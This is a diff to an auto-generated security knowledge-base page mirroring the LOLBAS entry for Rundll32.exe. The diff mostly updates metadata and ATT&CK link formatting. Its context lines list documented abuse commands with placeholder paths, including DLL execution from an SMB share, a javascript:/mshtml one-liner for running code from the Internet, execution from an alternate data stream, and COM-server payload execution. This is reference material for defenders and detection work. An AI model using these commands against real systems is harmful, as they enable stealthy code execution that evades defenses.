@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Rundll32.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "Rundll32.exe"
@@ -21,16 +21,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Rundll32.exe
-
 Used by Windows to execute dll files
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2018-05-25
-- Author: Oddvar Moe
-- Source Path: yml/OSBinaries/Rundll32.yml
 
 ## Paths
 
@@ -50,7 +41,7 @@ rundll32.exe {PATH},EntryPoint
 - Use Case: Execute DLL file
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.011]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]
 
 ### 2. Execute
 
@@ -63,7 +54,7 @@ rundll32.exe {PATH_SMB:.dll},EntryPoint
 - Use Case: Execute DLL from SMB share.
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.011]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]
 
 ### 3. Execute
 
@@ -76,7 +67,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
 - Use Case: Execute code from Internet
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.011]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]
 
 ### 4. ADS
 
@@ -89,7 +80,7 @@ rundll32 "{PATH}:ADSDLL.dll",DllMain
 - Use Case: Execute code from alternate data stream
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]
+- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]
 
 ### 5. Execute
 
@@ -102,7 +93,7 @@ rundll32.exe -sta {CLSID}
 - Use Case: Execute a DLL/EXE COM server payload or ScriptletURL code.
 - Privileges: User
 - Operating System: Windows 10 (and likely previous versions), Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.011]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]
 
 ## Detections
 
